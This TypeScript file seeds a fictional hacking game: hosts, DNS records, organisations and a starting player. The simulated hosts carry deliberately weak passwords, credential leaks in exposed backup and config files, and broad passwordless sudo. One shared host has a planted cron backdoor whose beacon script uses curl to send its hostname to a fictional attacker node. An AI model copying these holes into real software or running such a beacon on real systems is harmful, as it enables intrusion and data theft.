// Seeds the fictional, isolated internet and a fresh player. All addresses use
// RFC 5737 documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24)
// plus RFC 1918 private ranges, underlining that nothing here is real.

import type {
  DnsRecord,
  Host,
  Organization,
  PlayerState,
  SaveGame,
  WorldState,
} from "../types";
import { linuxHost, svc, user } from "./hostbuilder";

const T = (daysAgo: number, h = 3, m = 14) =>
  Date.now() - daysAgo * 86400000 + h * 3600000 + m * 60000;

// ── Player's own machine ────────────────────────────────────────────────────
function playerRig(): Host {
  return linuxHost({
    id: "local",
    hostname: "blacknet-rig",
    ip: "10.13.37.2",
    cidr: "10.13.37.0/24",
    gateway: "10.13.37.1",
    org: "self",
    idsSensitivity: 0,
    users: [
      user("root", 0, { password: "toor-local-only" }),
      user("operator", 1000, { gid: 1000, groups: [27], password: "operator" }),
    ],
    groups: [
      { gid: 0, name: "root", members: ["root"] },
      { gid: 27, name: "sudo", members: ["operator"] },
      { gid: 1000, name: "operator", members: [] },
    ],
    services: [svc(22, "ssh", "OpenSSH_9.2p1 Debian", { product: "OpenSSH", version: "9.2p1" })],
    files: {
      etc: {
        "sudoers.d": { operator: "operator ALL=(ALL) NOPASSWD: ALL\n" },
      },
    },
    homes: {
      operator: {
        "README.txt":
          "═══════════════════════════════════════════════════════════\n" +
          " BLACKNET // terminal operatora\n" +
          "═══════════════════════════════════════════════════════════\n\n" +
          "To jest Twoja maszyna (blacknet-rig). Stąd prowadzisz operacje\n" +
          "w fikcyjnej, odizolowanej sieci BLACKNET. Żadne polecenie nie\n" +
          "opuszcza tej symulacji.\n\n" +
          "Pierwsze kroki:\n" +
          "  help              – lista poleceń\n" +
          "  ls ; cat README.txt\n" +
          "  missions          – lista zleceń\n" +
          "  mission 1         – szczegóły zlecenia nr 1\n" +
          "  wallet            – stan konta i portfela\n\n" +
          "Masz pełne uprawnienia sudo na tej maszynie. Narzędzia nmap i nc\n" +
          "są już zainstalowane. Powodzenia, operatorze.\n",
        "notes.md":
          "# Notatnik\n\n- DNS gatewaya: 10.0.0.1 (ns1)\n" +
          "- Pierwszy cel zlecenia: domena aurora.example\n" +
          "- Przydatne: `nslookup <nazwa>`, `nmap -sV <host>`, `curl http://<host>/`\n",
        ".config": { "blacknet.conf": "theme=green\ncrt=1\n" },
      },
    },
    logs: [{ ts: T(1), facility: "auth", message: "Accepted password for operator from 10.13.37.1 port 51234 ssh2" }],
    motd: "\nblacknet-rig // operator\nSystem lokalny. Pełen dostęp.\n",
  });
}

// ── Aurora Technologies (tech company) ──────────────────────────────────────
function auroraWeb(): Host {
  return linuxHost({
    id: "aurora-web",
    hostname: "www.aurora.example",
    ip: "203.0.113.10",
    cidr: "203.0.113.0/24",
    gateway: "203.0.113.1",
    org: "aurora",
    idsSensitivity: 0.35,
    users: [
      user("root", 0, { password: "R00t!Aurora#2023" }),
      user("deploy", 1001, { gid: 1001, groups: [], password: "Aur0ra$Deploy!", home: "/home/deploy" }),
      user("www-data", 33, { gid: 33, home: "/var/www" }),
    ],
    groups: [
      { gid: 0, name: "root", members: ["root"] },
      { gid: 33, name: "www-data", members: [] },
      { gid: 1001, name: "deploy", members: [] },
    ],
    services: [
      svc(22, "ssh", "OpenSSH_8.4p1 Debian", {
        product: "OpenSSH",
        version: "8.4p1",
        creds: [{ user: "deploy", password: "Aur0ra$Deploy!" }],
      }),
      svc(80, "http", "nginx/1.22.1", {
        product: "nginx",
        version: "1.22.1",
        www: {
          "/": "<html><head><title>Aurora Technologies</title></head><body><h1>Aurora Technologies</h1><p>Budujemy przyszłość chmury.</p><!-- TODO: usunąć katalog /backup przed wdrożeniem --></body></html>",
          "/robots.txt": "User-agent: *\nDisallow: /backup/\nDisallow: /admin/\n",
          "/backup/": "<html><body><h1>Index of /backup</h1><ul><li><a href=\"deploy.yml\">deploy.yml</a></li><li><a href=\"db.sql\">db.sql</a></li></ul></body></html>",
          "/backup/deploy.yml":
            "# deploy config (DO NOT COMMIT)\nenvironment: production\nssh_host: www.aurora.example\ndeploy_user: deploy\ndeploy_pass: Aur0ra$Deploy!\n",
          "/admin/": "<html><body><h1>401 Unauthorized</h1></body></html>",
        },
      }),
    ],
    files: {
      etc: {
        "sudoers.d": {
          // Misconfiguration: deploy was granted overly-broad sudo (NOPASSWD:
          // ALL) — a common real-world mistake that yields full root.
          deploy: "deploy ALL=(ALL) NOPASSWD: ALL\n",
        },
      },
      root: {
        "flag.txt": { content: "BLACKNET{aurora_r00t_pivot_complete}\n", mode: 0o600, uid: 0, gid: 0 },
        "root-notes.txt": { content: "Przypomnienie: zrotować hasło deploy. Wyciek w /backup!\n", mode: 0o600, uid: 0, gid: 0 },
      },
    },
    homes: {
      deploy: {
        "deploy.log": "ostatnie wdrożenie: OK\n",
        ".ssh": { "authorized_keys": "ssh-ed25519 AAAA... deploy@ci\n" },
      },
    },
    logs: [
      { ts: T(3), facility: "auth", message: "Accepted password for deploy from 203.0.113.1 port 40222 ssh2" },
      { ts: T(2), facility: "web", message: "GET /backup/deploy.yml 200" },
    ],
  });
}

function auroraGit(): Host {
  return linuxHost({
    id: "aurora-git",
    hostname: "git.aurora.example",
    ip: "203.0.113.20",
    cidr: "203.0.113.0/24",
    gateway: "203.0.113.1",
    org: "aurora",
    idsSensitivity: 0.25,
    users: [user("root", 0, { password: "git-root-xzy" }), user("git", 1002, { gid: 1002 })],
    services: [
      svc(22, "ssh", "OpenSSH_8.4p1 Debian", { product: "OpenSSH", version: "8.4p1" }),
      svc(80, "http", "GitLab CE 15.1", {
        product: "GitLab",
        version: "15.1.0",
        www: {
          "/": "<html><body><h1>Aurora GitLab</h1><p>Projekty wewnętrzne.</p></body></html>",
          "/web-deploy/": "<html><body><h1>web-deploy</h1><a href=\"/web-deploy/raw/config/secrets.yml\">secrets.yml</a></body></html>",
          "/web-deploy/raw/config/secrets.yml":
            "production:\n  secret_key_base: 7f4c...\n  smtp_user: notifier@aurora.example\n  smtp_pass: N0tify-Aur0ra\n  deploy_user: deploy\n  deploy_pass: Aur0ra$Deploy!\n",
          "/.git/config": "[core]\n[remote \"origin\"]\n url = git@git.aurora.example:web/web-deploy.git\n",
        },
      }),
    ],
    logs: [{ ts: T(5), facility: "web", message: "GET /web-deploy/raw/config/secrets.yml 200" }],
  });
}

// ── Northgate University ────────────────────────────────────────────────────
function uniLab(): Host {
  return linuxHost({
    id: "uni-lab",
    hostname: "lab01.northgate.edu.example",
    ip: "192.0.2.50",
    cidr: "192.0.2.0/24",
    gateway: "192.0.2.1",
    org: "northgate",
    idsSensitivity: 0.1,
    users: [
      user("root", 0, { password: "changeme123" }),
      user("student", 1100, { gid: 1100, password: "student", home: "/home/student" }),
      user("jkowalski", 1101, { gid: 1101, password: "Jesien2023", home: "/home/jkowalski" }),
    ],
    services: [
      svc(22, "ssh", "OpenSSH_7.9p1 Debian", {
        product: "OpenSSH",
        version: "7.9p1",
        creds: [
          { user: "student", password: "student" },
          { user: "jkowalski", password: "Jesien2023" },
        ],
      }),
    ],
    files: {
      // Lab accounts get narrow sudo so students can read logs for coursework.
      etc: { "sudoers.d": { student: "student ALL=(ALL) NOPASSWD: /usr/bin/cat, /usr/bin/grep, /usr/bin/tail, /usr/bin/head\n" } },
    },
    homes: {
      student: {
        "witaj.txt": "Konto laboratoryjne. Hasło domyślne nie zostało zmienione.\n",
      },
      jkowalski: {
        "praca.txt": "Sprawozdanie z laboratorium 3...\n",
        ".bash_history": "ls\ncat /etc/passwd\nssh jkowalski@lab01\n",
      },
    },
    logs: [
      { ts: T(10), facility: "auth", message: "Failed password for student from 192.0.2.200 port 55012 ssh2" },
      { ts: T(10), facility: "auth", message: "Failed password for root from 192.0.2.200 port 55013 ssh2" },
      { ts: T(9), facility: "auth", message: "Accepted password for student from 192.0.2.200 port 55020 ssh2" },
    ],
  });
}

function uniWeb(): Host {
  return linuxHost({
    id: "uni-web",
    hostname: "www.northgate.edu.example",
    ip: "192.0.2.10",
    cidr: "192.0.2.0/24",
    gateway: "192.0.2.1",
    org: "northgate",
    users: [user("root", 0, { password: "uni-root-oops" }), user("www-data", 33, { gid: 33, home: "/var/www" })],
    services: [
      svc(80, "http", "Apache/2.4.54", {
        product: "Apache httpd",
        version: "2.4.54",
        www: {
          "/": "<html><body><h1>Northgate University</h1><p>Portal studencki.</p><a href=\"/status\">status</a></body></html>",
          "/status": "OK\ndb=connected\nlab=lab01.northgate.edu.example\n",
        },
      }),
    ],
  });
}

// ── Meridian Bank (hardened) ────────────────────────────────────────────────
function bankWeb(): Host {
  return linuxHost({
    id: "bank-web",
    hostname: "www.meridian-bank.example",
    ip: "198.51.100.10",
    cidr: "198.51.100.0/24",
    gateway: "198.51.100.1",
    org: "meridian",
    idsSensitivity: 0.8,
    users: [user("root", 0, { password: "d0-not-guess-me" })],
    services: [
      svc(443, "https", "nginx/1.24.0", {
        product: "nginx",
        version: "1.24.0",
        www: {
          "/": "<html><body><h1>Meridian Bank</h1><p>Bezpieczna bankowość.</p></body></html>",
          "/.well-known/security.txt": "Contact: security@meridian-bank.example\nPolicy: zgłoś luki, nie wykorzystuj.\n",
          "/api/status": "{\"status\":\"ok\",\"staging\":\"staging.meridian-bank.example\"}",
        },
      }),
    ],
    firewall: [
      { from: "*", port: 22, action: "drop" },
      { from: "*", port: 80, action: "drop" },
    ],
  });
}

function bankStaging(): Host {
  return linuxHost({
    id: "bank-staging",
    hostname: "staging.meridian-bank.example",
    ip: "198.51.100.20",
    cidr: "198.51.100.0/24",
    gateway: "198.51.100.1",
    org: "meridian",
    idsSensitivity: 0.5,
    users: [
      user("root", 0, { password: "staging-only-pw" }),
      user("qa", 1300, { gid: 1300, password: "qa-test-2024", home: "/home/qa" }),
    ],
    services: [
      svc(22, "ssh", "OpenSSH_8.9p1", {
        product: "OpenSSH",
        version: "8.9p1",
        creds: [{ user: "qa", password: "qa-test-2024" }],
      }),
      svc(8080, "http", "node/express", {
        product: "Express",
        version: "4.18",
        www: {
          "/": "<html><body><h1>Meridian STAGING</h1><p>Środowisko testowe — dane fikcyjne.</p></body></html>",
          "/debug": "ENV=staging\nQA_USER=qa\nQA_PASS=qa-test-2024\n",
        },
      }),
    ],
    homes: {
      qa: {
        "bounty.txt":
          "Program bug bounty Meridian: zgłoś lukę na security@meridian-bank.example.\n" +
          "Token zgłoszenia: BLACKNET{responsible_disclosure_meridian}\n",
      },
    },
  });
}

// ── HelioHost (hosting provider) ────────────────────────────────────────────
function helioPanel(): Host {
  return linuxHost({
    id: "helio-panel",
    hostname: "panel.heliohost.example",
    ip: "203.0.113.100",
    cidr: "203.0.113.0/24",
    gateway: "203.0.113.1",
    org: "helio",
    idsSensitivity: 0.4,
    users: [user("root", 0, { password: "helio-admin-9" }), user("admin", 1400, { gid: 1400, password: "panel-admin", home: "/home/admin" })],
    services: [
      svc(22, "ssh", "OpenSSH_8.4p1", { product: "OpenSSH", version: "8.4p1", creds: [{ user: "admin", password: "panel-admin" }] }),
      svc(80, "http", "nginx/1.22.1", {
        product: "nginx",
        version: "1.22.1",
        www: {
          "/": "<html><body><h1>HelioHost Panel</h1><a href=\"/config.php.bak\">config backup</a></body></html>",
          "/config.php.bak": "<?php\n$DB_HOST='shared1.heliohost.example';\n$DB_USER='admin';\n$DB_PASS='panel-admin';\n// konto współdzielone\n?>",
        },
      }),
    ],
  });
}

function helioShared(): Host {
  return linuxHost({
    id: "helio-shared",
    hostname: "shared1.heliohost.example",
    ip: "203.0.113.101",
    cidr: "203.0.113.0/24",
    gateway: "203.0.113.1",
    org: "helio",
    idsSensitivity: 0.3,
    users: [
      user("root", 0, { password: "shared-root-pw" }),
      user("admin", 1400, { gid: 1400, password: "panel-admin", home: "/home/admin" }),
      user("client7", 1407, { gid: 1407, home: "/home/client7" }),
    ],
    services: [
      svc(22, "ssh", "OpenSSH_8.4p1", {
        product: "OpenSSH",
        version: "8.4p1",
        creds: [{ user: "admin", password: "panel-admin" }],
      }),
    ],
    files: {
      // A backdoor planted by the rival group for incident-response missions.
      etc: {
        "cron.d": { "sysupdate": "*/5 * * * * root /tmp/.nullsec/beacon.sh\n" },
        // Hosting admins hold full sudo to remediate incidents.
        "sudoers.d": { admin: "admin ALL=(ALL) NOPASSWD: ALL\n" },
      },
      tmp: { ".nullsec": { "beacon.sh": "#!/bin/sh\n# NullSec beacon — exfil co 5 min\ncurl http://192.0.2.200/b?h=$(hostname)\n" } },
    },
    homes: {
      client7: { "index.html": "<h1>Strona klienta 7</h1>\n" },
    },
    logs: [
      { ts: T(2), facility: "auth", message: "Accepted publickey for admin from 192.0.2.200 port 44001 ssh2" },
      { ts: T(2), facility: "ids", message: "WARN nowy plik wykonywalny w /tmp/.nullsec/" },
    ],
  });
}

// ── Civic Data Authority (gov-style) ────────────────────────────────────────
function civicPortal(): Host {
  return linuxHost({
    id: "civic-portal",
    hostname: "portal.civicdata.example",
    ip: "198.51.100.50",
    cidr: "198.51.100.0/24",
    gateway: "198.51.100.1",
    org: "civic",
    idsSensitivity: 0.5,
    users: [user("root", 0, { password: "civic-root-8" })],
    services: [
      svc(80, "http", "nginx/1.22.1", {
        product: "nginx",
        version: "1.22.1",
        www: {
          "/": "<html><body><h1>Civic Data Authority</h1><p>Rejestr publiczny.</p><a href=\"/records?id=1\">rekord 1</a></body></html>",
          "/records?id=1": "{\"id\":1,\"type\":\"public\",\"title\":\"Budżet miasta 2024\"}",
          "/records?id=42": "{\"id\":42,\"type\":\"public\",\"title\":\"Raport środowiskowy\",\"ref\":\"BLACKNET{foia_record_42_released}\"}",
          "/records?id=0": "{\"error\":\"not found\"}",
        },
      }),
    ],
  });
}

// ── NewsWire (news site) ────────────────────────────────────────────────────
function newsWire(): Host {
  return linuxHost({
    id: "news-wire",
    hostname: "www.newswire.example",
    ip: "192.0.2.80",
    cidr: "192.0.2.0/24",
    gateway: "192.0.2.1",
    org: "news",
    users: [user("root", 0, { password: "news-root-pw" })],
    services: [
      svc(80, "http", "nginx/1.22.1", {
        product: "nginx",
        version: "1.22.1",
        www: {
          "/": "<html><body><h1>NewsWire</h1><ul><li>Grupa NullSec atakuje dostawców hostingu</li><li>Meridian Bank uruchamia bug bounty</li></ul></body></html>",
          "/leak":
            "Anonimowe źródło. Wiadomość zakodowana Base64 — zdekoduj ją:\n" +
            "UHJ6ZWNpZWs6IHNrb250YWt0dWogc2llIHogYm9hcmQuaG9sbG93ICgxMC42Ni42LjYpLiBGbGFnYTogQkxBQ0tORVR7aG9sbG93X2JvYXJkX2luZm9ybWFudH0=\n",
        },
      }),
    ],
  });
}

// ── The Hollow (underground board) + NullSec node ───────────────────────────
function theHollow(): Host {
  return linuxHost({
    id: "hollow-board",
    hostname: "board.hollow",
    ip: "10.66.6.6",
    cidr: "10.66.6.0/24",
    gateway: "10.66.6.1",
    org: "hollow",
    idsSensitivity: 0.2,
    users: [user("root", 0, { password: "hollow-root" }), user("ghost", 1500, { gid: 1500, password: "spookyhash", home: "/home/ghost" })],
    services: [
      svc(22, "ssh", "OpenSSH_9.0p1", { product: "OpenSSH", version: "9.0p1", creds: [{ user: "ghost", password: "spookyhash" }] }),
      svc(80, "http", "nginx/1.24.0", {
        product: "nginx",
        version: "1.24.0",
        www: {
          "/": "<html><body><h1>The Hollow</h1><p>Forum podziemia. Wątki:</p><ul><li><a href=\"/t/nullsec\">NullSec rekrutuje</a></li></ul></body></html>",
          "/t/nullsec": "NullSec: szukamy dostępu do dostawców hostingu. Kontakt: node 192.0.2.200. Nasz beacon: /tmp/.nullsec/beacon.sh",
        },
      }),
    ],
    homes: { ghost: { "kontakty.txt": "NullSec node: 192.0.2.200\n" } },
  });
}

function nullsecNode(): Host {
  return linuxHost({
    id: "nullsec",
    hostname: "node.nullsec",
    ip: "192.0.2.200",
    cidr: "192.0.2.0/24",
    gateway: "192.0.2.1",
    org: "nullsec",
    idsSensitivity: 0.6,
    users: [user("root", 0, { password: "nullsec-c2-root" })],
    services: [
      svc(80, "http", "nginx/1.24.0", {
        product: "nginx",
        version: "1.24.0",
        www: {
          "/": "<html><body><h1>node.nullsec</h1><p>restricted</p></body></html>",
          "/b": "ack",
          "/targets.txt": "shared1.heliohost.example\nlab01.northgate.edu.example\nwww.aurora.example",
        },
      }),
    ],
  });
}

// ── DNS + organizations ─────────────────────────────────────────────────────
function dnsRecords(): DnsRecord[] {
  const a = (name: string, value: string): DnsRecord => ({ name, type: "A", value });
  return [
    a("ns1.blacknet", "10.0.0.1"),
    a("blacknet-rig", "10.13.37.2"),
    a("www.aurora.example", "203.0.113.10"),
    a("aurora.example", "203.0.113.10"),
    a("git.aurora.example", "203.0.113.20"),
    a("www.northgate.edu.example", "192.0.2.10"),
    a("northgate.edu.example", "192.0.2.10"),
    a("lab01.northgate.edu.example", "192.0.2.50"),
    a("www.meridian-bank.example", "198.51.100.10"),
    a("meridian-bank.example", "198.51.100.10"),
    a("staging.meridian-bank.example", "198.51.100.20"),
    a("panel.heliohost.example", "203.0.113.100"),
    a("shared1.heliohost.example", "203.0.113.101"),
    a("portal.civicdata.example", "198.51.100.50"),
    a("www.newswire.example", "192.0.2.80"),
    a("board.hollow", "10.66.6.6"),
    a("node.nullsec", "192.0.2.200"),
    { name: "aurora.example", type: "MX", value: "mail.aurora.example" },
    { name: "aurora.example", type: "TXT", value: "blacknet-hint: zacznij od robots.txt" },
    { name: "www.aurora.example", type: "CNAME", value: "aurora.example" },
  ];
}

function organizations(): Record<string, Organization> {
  const mk = (id: string, name: string, kind: Organization["kind"], description: string): Organization => ({
    id,
    name,
    kind,
    description,
    reputation: 0,
  });
  return {
    self: mk("self", "Operator", "underground", "Ty."),
    aurora: mk("aurora", "Aurora Technologies", "tech", "Firma chmurowa z niechlujnym bezpieczeństwem."),
    meridian: mk("meridian", "Meridian Bank", "bank", "Bank z programem bug bounty i twardą obroną."),
    northgate: mk("northgate", "Northgate University", "university", "Uczelnia ze słabymi kontami laboratoryjnymi."),
    helio: mk("helio", "HelioHost", "hosting", "Dostawca hostingu współdzielonego."),
    civic: mk("civic", "Civic Data Authority", "gov", "Urząd danych publicznych."),
    news: mk("news", "NewsWire", "news", "Serwis informacyjny."),
    hollow: mk("hollow", "The Hollow", "underground", "Forum podziemia."),
    nullsec: mk("nullsec", "NullSec", "underground", "Wroga grupa hakerska."),
    isp: mk("isp", "BLACKNET ISP", "isp", "Operator szkieletu sieci."),
  };
}

function backboneDns(): Host {
  return linuxHost({
    id: "ns1",
    hostname: "ns1.blacknet",
    ip: "10.0.0.1",
    cidr: "10.0.0.0/24",
    org: "isp",
    users: [user("root", 0, { password: "ns1-root" })],
    services: [svc(53, "dns", "ISC BIND 9.18", { proto: "udp", product: "BIND", version: "9.18" })],
  });
}

export function buildWorld(): WorldState {
  const hosts: Host[] = [
    playerRig(),
    backboneDns(),
    auroraWeb(),
    auroraGit(),
    uniWeb(),
    uniLab(),
    bankWeb(),
    bankStaging(),
    helioPanel(),
    helioShared(),
    civicPortal(),
    newsWire(),
    theHollow(),
    nullsecNode(),
  ];
  const map: Record<string, Host> = {};
  for (const h of hosts) map[h.id] = h;
  return {
    hosts: map,
    dns: dnsRecords(),
    organizations: organizations(),
    seed: 1337,
  };
}

export function newPlayer(username: string, world: WorldState): PlayerState {
  const now = Date.now();
  return {
    username,
    localHostId: "local",
    session: {
      hostId: "local",
      uid: 1000,
      cwd: "/home/operator",
      env: {
        PATH: "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin",
        HOME: "/home/operator",
        USER: "operator",
        SHELL: "/bin/bash",
        PWD: "/home/operator",
        HOSTNAME: "blacknet-rig",
        TERM: "xterm-256color",
        LANG: "pl_PL.UTF-8",
      },
      stack: [],
    },
    credits: 500,
    bankBalance: 0,
    skills: { recon: 1, exploitation: 1, crypto: 1, forensics: 1, social: 1, stealth: 1 },
    reputationByOrg: {},
    inventory: [
      { id: "nmap", name: "nmap", kind: "software", description: "Skaner portów", unlocks: "nmap" },
      { id: "nc", name: "netcat", kind: "software", description: "Narzędzie sieciowe", unlocks: "nc" },
    ],
    transactions: [],
    missions: {},
    suspicion: { heat: 0, byHost: {} },
    capabilities: ["nmap", "nc"],
    discovered: ["local", "ns1"],
    accessByHost: { local: ["operator", "root"] },
    settings: { theme: "green", crt: true, reducedMotion: false, fontSize: 14 },
    terminalHistory: [],
    createdAt: now,
    updatedAt: now,
  };
}

export function newSaveGame(username: string): SaveGame {
  const world = buildWorld();
  return { version: 1, player: newPlayer(username, world), world };
}
